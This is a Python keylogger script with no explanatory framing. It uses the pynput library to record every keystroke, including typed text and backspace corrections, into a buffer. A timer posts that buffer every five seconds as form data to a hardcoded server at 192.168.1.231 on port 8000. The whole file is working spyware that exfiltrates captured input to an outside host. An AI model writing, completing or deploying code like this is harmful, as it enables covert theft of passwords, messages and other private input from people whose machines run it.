import json
import requests
import threading
import http.client, urllib.parse
from pynput import keyboard

# global variable for the text to be logged
text = ""

# server ip and port number
http_ip = "192.168.1.231"
http_port = "8000"
interval = 5

def send_data_to_server():
    try:
        params = urllib.parse.urlencode({"text": text})
        headers = {"Content-type": "application/x-www-form-urlencoded",
           "Accept": "text/plain"}
        conn = http.client.HTTPConnection(http_ip, http_port)
        try:
            conn.request("POST", "", params, headers)
        except Exception as e:
            print("error sending data to server", e)
        
        timer = threading.Timer(interval, send_data_to_server)
        timer.start()
    except:
        print("Failed request")

def on_key_stroke(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_key_stroke) as listener:
    send_data_to_server()
    listener.join()